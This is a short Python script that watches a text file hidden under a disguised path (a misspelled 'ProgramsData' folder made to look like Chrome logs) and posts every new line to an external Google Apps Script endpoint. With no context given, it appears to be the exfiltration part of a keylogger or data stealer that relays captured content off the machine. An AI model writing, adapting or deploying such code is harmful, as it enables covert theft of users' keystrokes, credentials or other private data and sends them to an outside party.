import time
import requests

file_path = r"C:\ProgramsData\ProductData\Temp\Chrome\logs\oops.txt"
google_url = "https://script.google.com/macros/s/AKfycbyFclwVkLtTcGt8fsW06kODyXaOhFXtWv4E3tQEuEi-mkm65fm-zV49n8wAnIuhVRq5/exec"

interval = 2      # check file every 2 seconds
line_delay = 5   # delay between sending lines

last_line_sent = ""

while True:
    try:
        with open(file_path, "r", encoding="utf-8") as f:
            lines = [line.strip() for line in f if line.strip()]

        if last_line_sent in lines:
            idx = lines.index(last_line_sent)
            new_lines = lines[idx + 1:]
        else:
            new_lines = lines

        for line in new_lines:
            r = requests.post(
                google_url,
                data=line,
                headers={"Content-Type": "text/plain"}
            )
            print("Sent:", line, r.text)
            last_line_sent = line
            time.sleep(line_delay)

    except Exception as e:
        print("Error:", e)

    time.sleep(interval)
